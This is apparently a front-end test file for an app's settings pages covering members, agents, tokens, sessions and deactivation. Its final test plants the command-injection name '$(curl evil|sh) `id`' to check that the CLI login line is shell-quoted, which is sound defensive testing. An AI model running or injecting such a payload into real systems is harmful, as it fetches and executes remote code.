import { screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it } from "vitest";
import type { Member, Session, Token } from "@/api/client";
import { json, mockApi } from "@/test/api";
import { ada, bob, builder, engineer, health, me, memberDetail, ops, review, signedIn, task, web } from "@/test/fixtures";
import { renderApp } from "@/test/render";

const at = "2026-10-01T09:00:00Z";
const later = (minutes: number) => new Date(Date.now() + minutes * 60_000).toISOString();
const gone: Member = { id: "m-gone", name: "gone", kind: "agent", admin: false, created_at: at, deactivated_at: at };
const everyone = [ada, bob, builder, gone];

/** Every Member's record, as the Members and Agents tables read it: bob also in OPS with review. */
const details = {
  "GET /v1/members": { items: everyone },
  "GET /v1/members/:member": ({ params }: { params: Record<string, string> }) => {
    const m = everyone.find((x) => x.id === params.member)!;
    return m.id === bob.id ? memberDetail(m, { projects: [ops, web], skills: [engineer, review] }) : memberDetail(m);
  },
};

describe("Settings › Members", () => {
  it("groups Humans and Agents with their Projects, Skills and Reporting line, and marks the caller", async () => {
    mockApi({ ...signedIn(), ...details });
    renderApp("/settings/organisation/members");
    const table = await screen.findByRole("table", { name: "Members" });
    expect(within(table).getByRole("rowheader", { name: "Humans 2" })).toBeInTheDocument();
    expect(within(table).getByRole("rowheader", { name: "Agents 2" })).toBeInTheDocument();
    const rows = within(table).getAllByRole("row").map((r) => r.getAttribute("aria-label"));
    expect(rows.filter(Boolean)).toEqual(["ada", "bob", "builder", "gone"]);
    expect(within(table).getAllByRole("columnheader").map((h) => h.textContent)).toEqual(["Member", "Model", "Projects", "Skills", "Reporting line", "Admin"]);

    const b = within(table).getByRole("row", { name: "bob" });
    // Two Projects are their marks and a count, named on hover; one is named.
    expect(await within(b).findByText("2 Projects")).toBeInTheDocument();
    expect(within(b).getByTitle("Ops, Web")).toBeInTheDocument();
    expect(within(within(table).getByRole("row", { name: "ada" })).getByText("Web")).toBeInTheDocument();
    expect(within(b).getByText("review")).toBeInTheDocument();
    // bob reports to ada; ada to no one.
    expect(within(b).getAllByText("ada")).not.toHaveLength(0);
    expect(within(within(table).getByRole("row", { name: "ada" })).getByText("No one")).toBeInTheDocument();
    expect(within(within(table).getByRole("row", { name: "ada" })).getByText("you")).toBeInTheDocument();
    expect(within(within(table).getByRole("row", { name: "gone" })).getByText("Deactivated")).toBeInTheDocument();

    // A human's page is under Members, an agent's under Agents, where its Runner settings are.
    expect(within(b).getByRole("link")).toHaveAttribute("href", "/settings/organisation/members/m-bob");
    expect(within(within(table).getByRole("row", { name: "builder" })).getByRole("link")).toHaveAttribute("href", "/settings/organisation/agents/m-builder");
  });

  it("tells a Member who is not an admin that the Organisation's pages are for admins", async () => {
    mockApi({ ...signedIn(bob), "GET /v1/me": me(bob) });
    renderApp("/settings/organisation/members");
    expect(await screen.findByRole("heading", { name: "Admins only" })).toBeInTheDocument();
    expect(screen.queryByRole("table", { name: "Members" })).not.toBeInTheDocument();
  });

  it("New Member makes a human in the Projects ticked, then offers a sign-in link", async () => {
    const user = userEvent.setup();
    const created: Member = { id: "m-cy", name: "cy", kind: "human", admin: false, email: "cy@example.com", created_at: at };
    const api = mockApi({
      ...signedIn(),
      "POST /v1/members": json(201, created),
      "PUT /v1/projects/:project/members/:member": undefined,
      "POST /v1/members/:member/login-links": json(201, { url: "http://localhost/login/abc", expires_at: later(15) }),
    });
    renderApp("/settings/organisation/members?new=1");
    const dialog = await screen.findByRole("dialog", { name: "New Member" });
    expect(within(dialog).getByRole("radio", { name: "Human" })).toHaveAttribute("aria-checked", "true");
    // The Project the app is in starts ticked.
    const projects = await within(dialog).findByRole("group", { name: "Projects" });
    await waitFor(() => expect(within(projects).getByRole("checkbox", { name: "Web" })).toBeChecked());
    expect(within(projects).getByRole("checkbox", { name: "Ops" })).not.toBeChecked();
    await user.click(within(projects).getByRole("checkbox", { name: "Ops" }));
    await user.type(within(dialog).getByLabelText("Name"), "cy");
    await user.type(within(dialog).getByLabelText("Email"), "cy@example.com");
    await user.click(within(dialog).getByRole("button", { name: "Create Member" }));

    const link = await screen.findByRole("dialog", { name: "Sign-in link for cy" });
    await user.click(within(link).getByRole("button", { name: "Issue link" }));
    expect(await within(link).findByRole("textbox", { name: "Sign-in link" })).toHaveValue("http://localhost/login/abc");
    const writes = api.calls.filter((c) => c.method !== "GET");
    expect(writes.map((c) => `${c.method} ${c.path}`)).toEqual([
      "POST /v1/members",
      "PUT /v1/projects/WEB/members/m-cy",
      "PUT /v1/projects/OPS/members/m-cy",
      "POST /v1/members/m-cy/login-links",
    ]);
    expect(writes[0].body).toEqual({ name: "cy", kind: "human", email: "cy@example.com", admin: false });
  });

  it("says beside the secret what failed after the agent was made", async () => {
    const user = userEvent.setup();
    const created: Member = { id: "m-new", name: "builder-9", kind: "agent", admin: false, created_at: at };
    mockApi({
      ...signedIn(),
      "POST /v1/members": json(201, created),
      "POST /v1/members/:member/tokens": json(201, { token: { id: "t-1", member_id: "m-new", name: "default", prefix: "dk_s3cr", created_at: at }, secret: "dk_s3cret-shown-once" }),
      "PATCH /v1/members/:member/agent": created,
      "PUT /v1/projects/:project/members/:member": json(403, { code: "forbidden", message: "Only an admin adds a Member to a Project" }),
    });
    renderApp("/settings/organisation/members?new=1&kind=agent");
    const dialog = await screen.findByRole("dialog", { name: "New Member" });
    await user.type(within(dialog).getByLabelText("Name"), "builder-9");
    await user.click(within(dialog).getByRole("button", { name: "Create Member" }));
    const once = await screen.findByRole("dialog", { name: "Token for builder-9" });
    expect(within(once).getByRole("textbox", { name: "Secret of default" })).toHaveValue("dk_s3cret-shown-once");
    expect(within(once).getByText("It will not be shown again.")).toBeInTheDocument();
    expect(within(once).getByRole("alert")).toHaveTextContent("forbidden Only an admin adds a Member to a Project");
  });
});

describe("Settings › a Member", () => {
  const tokens: Token[] = [
    { id: "t-live", member_id: builder.id, name: "seed", prefix: "dk_uxx9Yw", created_at: at, last_used_at: at },
    { id: "t-old", member_id: builder.id, name: "old", prefix: "dk_0ld", created_at: at, revoked_at: at },
  ];
  const sessions: Session[] = [{ id: "sess-builder-1", member_id: builder.id, kind: "token", token_id: "t-live", started_at: at, last_seen_at: at }];
  const held = task(3, {
    claim: { id: "c-1", task_id: "k-3", holder_id: builder.id, session_id: "sess-builder-1", started_at: at, expires_at: later(15), heartbeat_timeout_seconds: 900, model_label: "claude-opus-5-5" },
  });

  it("Deactivate asks first and says what it stops, counted from the live record", async () => {
    const user = userEvent.setup();
    const api = mockApi({
      ...signedIn(),
      ...details,
      "GET /v1/members/:member/tokens": { items: tokens },
      "GET /v1/members/:member/sessions": { items: sessions },
      "GET /v1/tasks": ({ query }) => ({ items: query.get("holder") === builder.id ? [held] : [] }),
      "POST /v1/members/:member/deactivate": { ...builder, deactivated_at: at },
    });
    renderApp("/settings/organisation/agents/m-builder");
    expect(await screen.findByRole("heading", { name: "builder" })).toBeInTheDocument();
    expect(screen.getByRole("navigation", { name: "Breadcrumb" })).toHaveTextContent("Settings/Agents/builder");
    // The Session says what it holds.
    const session = await screen.findByRole("listitem", { name: "Session sess-builder-1" });
    expect(within(session).getByText("Holding WEB-3")).toBeInTheDocument();
    expect(within(session).getByText(/claude-opus-5-5/)).toBeInTheDocument();
    // Only the live token is listed.
    expect(screen.getByRole("listitem", { name: "Token seed" })).toBeInTheDocument();
    expect(screen.queryByRole("listitem", { name: "Token old" })).not.toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: "More for builder" }));
    await user.click(await screen.findByRole("menuitem", { name: "Deactivate" }));
    const confirm = await screen.findByRole("dialog", { name: "Deactivate builder?" });
    expect(confirm).toHaveTextContent("Revokes1 tokenseed");
    expect(confirm).toHaveTextContent("Closes1 Session…uilder-1");
    expect(confirm).toHaveTextContent("Ends1 ClaimWEB-3");
    expect(api.calls.some((c) => c.path.endsWith("/deactivate"))).toBe(false);

    await user.click(within(confirm).getByRole("button", { name: "Deactivate" }));
    await waitFor(() => expect(api.calls.some((c) => c.method === "POST" && c.path === "/v1/members/m-builder/deactivate")).toBe(true));
  });

  it("puts a Member in a Project and takes them out of one, by its key", async () => {
    const user = userEvent.setup();
    const api = mockApi({
      ...signedIn(),
      ...details,
      "PUT /v1/projects/:project/members/:member": undefined,
      "DELETE /v1/projects/:project/members/:member": undefined,
    });
    renderApp("/settings/organisation/members/m-ada");
    const form = await screen.findByRole("group", { name: "Settings of ada" });
    await user.click(within(form).getByRole("button", { name: "Add to Project" }));
    await user.click(await screen.findByRole("option", { name: /Ops/ }));
    await user.click(within(form).getByRole("button", { name: "Remove from Web" }));
    await waitFor(() => expect(api.calls.filter((c) => c.method !== "GET")).toHaveLength(2));
    expect(api.calls.filter((c) => c.method !== "GET").map((c) => `${c.method} ${c.path}`)).toEqual([
      "PUT /v1/projects/OPS/members/m-ada",
      "DELETE /v1/projects/WEB/members/m-ada",
    ]);
  });

  it("sets the Reporting line to any active Member, human or agent, or to no one", async () => {
    const user = userEvent.setup();
    const api = mockApi({ ...signedIn(), ...details, "PUT /v1/members/:member/manager": undefined, "DELETE /v1/members/:member/manager": undefined });
    renderApp("/settings/organisation/members/m-bob");
    const select = await screen.findByRole("combobox", { name: "Reports to" });
    expect(select).toHaveTextContent("ada");
    await user.click(select);
    // Not bob himself, nor the deactivated agent.
    expect((await screen.findAllByRole("option")).map((o) => o.textContent)).toEqual(["No one", "Aada", "BLbuilder"]);
    await user.click(screen.getByRole("option", { name: /builder/ }));
    await waitFor(() => expect(api.calls.some((c) => c.method === "PUT")).toBe(true));
    expect(api.calls.find((c) => c.method === "PUT")).toMatchObject({ path: "/v1/members/m-bob/manager", body: { manager: "m-builder" } });
  });

  it("a Member who holds nothing is deactivated with nothing listed", async () => {
    const user = userEvent.setup();
    mockApi({ ...signedIn(), ...details });
    renderApp("/settings/organisation/members/m-bob");
    await user.click(await screen.findByRole("button", { name: "More for bob" }));
    await user.click(await screen.findByRole("menuitem", { name: "Deactivate" }));
    expect(await screen.findByRole("dialog", { name: "Deactivate bob?" })).toHaveTextContent("Holds no token, Session or Claim.");
  });
});

describe("Settings › Agents", () => {
  const runner: Member = { ...builder, agent: { command: "claude", args: [], model: "claude-sonnet-5-5", env: {}, unattended: true, paused: false } };
  const paused: Member = { id: "m-qa", name: "qa", kind: "agent", admin: false, created_at: at, agent: { ...runner.agent!, model: "claude-opus-5-5", paused: true } };
  const own: Member = { id: "m-bot", name: "bot", kind: "agent", admin: false, created_at: at };

  it("lists only the agents, with how each works and its model", async () => {
    const all = [ada, bob, runner, paused, own];
    mockApi({
      ...signedIn(),
      "GET /v1/members": { items: all },
      "GET /v1/members/:member": ({ params }) => memberDetail(all.find((m) => m.id === params.member)!),
    });
    renderApp("/settings/organisation/agents");
    const table = await screen.findByRole("table", { name: "Agents" });
    expect(within(table).getAllByRole("row").map((r) => r.getAttribute("aria-label")).filter(Boolean)).toEqual(["builder", "qa", "bot"]);
    const row = (name: string) => within(table).getByRole("row", { name });
    expect(within(row("builder")).getByText("Runner")).toBeInTheDocument();
    expect(within(row("builder")).getByText("claude-sonnet-5-5")).toBeInTheDocument();
    expect(within(row("qa")).getByText("Paused")).toBeInTheDocument();
    expect(within(row("bot")).getByText("Own token")).toBeInTheDocument();
    expect(within(row("qa")).getByRole("link")).toHaveAttribute("href", "/settings/organisation/agents/m-qa");
  });

  it("New agent is New Member with the kind fixed: no Kind, no Email", async () => {
    const user = userEvent.setup();
    mockApi(signedIn());
    renderApp("/settings/organisation/agents");
    await user.click(await screen.findByRole("button", { name: "New agent" }));
    const dialog = await screen.findByRole("dialog", { name: "New agent" });
    expect(within(dialog).queryByRole("radiogroup", { name: "Kind" })).not.toBeInTheDocument();
    expect(within(dialog).queryByLabelText("Email")).not.toBeInTheDocument();
    expect(within(dialog).getByRole("switch", { name: "Run with the Runner" })).toBeChecked();
    expect(within(dialog).getByRole("button", { name: "Create agent" })).toBeDisabled();
  });

  it("says what an agent is when there is none", async () => {
    mockApi({ ...signedIn(), "GET /v1/members": { items: [ada, bob] } });
    renderApp("/settings/organisation/agents");
    expect(await screen.findByRole("heading", { name: "No agents yet" })).toBeInTheDocument();
  });
});

describe("Settings › Account", () => {
  const tokens: Token[] = [{ id: "t-init", member_id: ada.id, name: "init", prefix: "dk_O1vgU1", created_at: at }];
  const sessions: Session[] = [
    { id: "browser-1", member_id: ada.id, kind: "browser", started_at: at, last_seen_at: at },
    { id: "browser-2", member_id: ada.id, kind: "browser", started_at: at, last_seen_at: at },
  ];

  it("shows the profile, gives each token and each other Session one ⋯, and Log out to this browser only", async () => {
    const user = userEvent.setup();
    const api = mockApi({
      ...signedIn(),
      "GET /v1/members/:member/tokens": { items: tokens },
      "GET /v1/members/:member/sessions": { items: sessions },
    });
    renderApp("/settings/account");
    const profile = await screen.findByRole("group", { name: "Profile" });
    expect(profile).toHaveTextContent("Emailada@example.com");
    expect(profile).toHaveTextContent("Projects1WWeb");
    expect(profile).toHaveTextContent("darkory login ada");

    const token = await screen.findByRole("listitem", { name: "Token init" });
    expect(within(token).getAllByRole("button").map((b) => b.getAttribute("aria-label"))).toEqual(["More for token init"]);
    // Besides its id, which copies itself, a Session has one action.
    const actions = (row: HTMLElement) => within(row).getAllByRole("button").filter((b) => !b.getAttribute("aria-label")?.startsWith("Copy the Session id"));
    const here = await screen.findByRole("listitem", { name: "This browser" });
    expect(actions(here).map((b) => b.textContent)).toEqual(["Log out"]);
    const other = screen.getByRole("listitem", { name: "Session browser-2" });
    expect(actions(other).map((b) => b.getAttribute("aria-label"))).toEqual(["More for Session browser-2"]);
    expect(screen.getAllByRole("button", { name: /Log out/ })).toHaveLength(1);

    await user.click(within(other).getByRole("button", { name: "More for Session browser-2" }));
    await user.click(await screen.findByRole("menuitem", { name: "Close Session" }));
    const confirm = await screen.findByRole("dialog", { name: "Close browser-2?" });
    expect(api.calls.some((c) => c.method !== "GET" && c.path.includes("browser-2"))).toBe(false);
    expect(within(confirm).getByRole("button", { name: "Close Session" })).toBeInTheDocument();
  });

  it("points an admin to their page under Members, and shows no such link to anyone else", async () => {
    mockApi(signedIn());
    const first = renderApp("/settings/account");
    expect(await screen.findByRole("link", { name: "Change in Members" })).toHaveAttribute("href", "/settings/organisation/members/m-ada");
    first.unmount();

    mockApi({ ...signedIn(bob), "GET /v1/me": me(bob) });
    renderApp("/settings/account");
    expect(await screen.findByRole("heading", { name: "bob" })).toBeInTheDocument();
    expect(screen.queryByRole("link", { name: "Change in Members" })).not.toBeInTheDocument();
  });
});

describe("Settings › Install", () => {
  it("says the version, a newer release, how humans sign in, and that no Runner is attached", async () => {
    mockApi({ ...signedIn(), "GET /v1/health": health({ update_available: true, latest_version: "v1.3.0", sign_in_modes: ["printed_link", "email_link"] }) });
    renderApp("/settings/organisation/install");
    const install = await screen.findByRole("group", { name: "Install" });
    expect(await within(install).findByText("v1.2.0")).toBeInTheDocument();
    expect(within(install).getByText("v1.3.0 available")).toBeInTheDocument();
    expect(within(install).getByText(/Printed links/)).toBeInTheDocument();
    expect(within(install).getByText(/Emailed links/)).toBeInTheDocument();
    expect(await within(install).findByText("Not attached")).toBeInTheDocument();
    expect(within(install).getByText("3 Members")).toBeInTheDocument();
    expect(within(install).getByText("2 Projects")).toBeInTheDocument();
  });

  it("counts the Runner's sessions when one is attached", async () => {
    mockApi({ ...signedIn(), "GET /v1/runner/sessions": { items: [], runner: true } });
    renderApp("/settings/organisation/install");
    expect(await screen.findByText("Attached")).toBeInTheDocument();
    expect(screen.getByText("0 sessions running")).toBeInTheDocument();
  });
});

describe("Settings › Account's CLI line", () => {
  it("single-quotes a name the shell would expand, so pasting it runs nothing", async () => {
    const evil = { ...bob, name: "$(curl evil|sh) `id`" };
    mockApi({ ...signedIn(evil), "GET /v1/me": me(evil) });
    renderApp("/settings/account");
    expect(await screen.findByText("darkory login '$(curl evil|sh) `id`'")).toBeInTheDocument();
  });
});
